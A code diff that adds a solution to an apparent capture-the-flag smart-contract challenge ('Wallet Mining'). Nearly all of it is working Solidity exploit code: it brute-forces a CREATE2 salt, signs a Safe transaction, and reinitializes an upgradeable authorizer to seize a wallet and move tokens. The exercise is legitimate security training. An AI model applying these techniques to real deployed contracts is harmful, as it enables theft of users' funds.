@@ -157,7 +157,59 @@ contract WalletMiningChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_walletMining() public checkSolvedByPlayer {
-        
+        address[] memory owners = new address[](1);
+        owners[0] = user;
+        bytes memory initializer = abi.encodeCall(
+            Safe.setup, (owners, 1, address(0), "", address(0), address(0), 0, payable(address(0)))
+        );
+
+        uint256 saltNonce;
+        bytes32 initCodeHash =
+            keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy)))));
+        for (; saltNonce < 100; saltNonce++) {
+            address predicted = vm.computeCreate2Address(
+                keccak256(abi.encodePacked(keccak256(initializer), saltNonce)), initCodeHash, address(proxyFactory)
+            );
+            if (predicted == USER_DEPOSIT_ADDRESS) break;
+        }
+
+        bytes memory transferData = abi.encodeCall(token.transfer, (user, DEPOSIT_TOKEN_AMOUNT));
+        bytes32 safeTxHash = keccak256(
+            abi.encode(
+                0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8,
+                address(token),
+                0,
+                keccak256(transferData),
+                Enum.Operation.Call,
+                0,
+                0,
+                0,
+                address(0),
+                address(0),
+                0
+            )
+        );
+        bytes32 domainSeparator = keccak256(
+            abi.encode(
+                0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218,
+                block.chainid,
+                USER_DEPOSIT_ADDRESS
+            )
+        );
+        bytes32 txHash = keccak256(abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator, safeTxHash));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
+
+        new WalletMiningExploit(
+            authorizer,
+            walletDeployer,
+            token,
+            ward,
+            USER_DEPOSIT_ADDRESS,
+            initializer,
+            saltNonce,
+            transferData,
+            abi.encodePacked(r, s, v)
+        );
     }
 
     /**
@@ -188,5 +240,32 @@ contract WalletMiningChallenge is Test {
 
         // Player sent payment to ward
         assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
+    }
+}
+
+contract WalletMiningExploit {
+    constructor(
+        AuthorizerUpgradeable authorizer,
+        WalletDeployer walletDeployer,
+        DamnValuableToken token,
+        address ward,
+        address safe,
+        bytes memory initializer,
+        uint256 saltNonce,
+        bytes memory transferData,
+        bytes memory signatures
+    ) {
+        address[] memory wards = new address[](1);
+        address[] memory aims = new address[](1);
+        wards[0] = address(this);
+        aims[0] = safe;
+        authorizer.init(wards, aims);
+
+        require(walletDeployer.drop(safe, initializer, saltNonce), "drop failed");
+        token.transfer(ward, token.balanceOf(address(this)));
+
+        Safe(payable(safe)).execTransaction(
+            address(token), 0, transferData, Enum.Operation.Call, 0, 0, 0, address(0), payable(address(0)), signatures
+        );
     }
 }
